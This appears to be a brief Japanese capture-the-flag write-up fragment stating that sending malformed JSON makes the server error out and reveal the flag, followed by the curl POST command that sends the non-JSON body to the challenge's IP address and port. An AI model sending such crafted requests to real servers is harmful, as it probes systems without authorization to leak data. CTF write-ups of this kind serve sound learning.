ペイロードは以下。不正なJSONを送信することで、サーバーがエラーを返し、フラグが表示される。

```bash
curl -X POST -H "Content-Type: application/json" -d "I_AM_ALPACA" http://34.170.146.252:43880/
```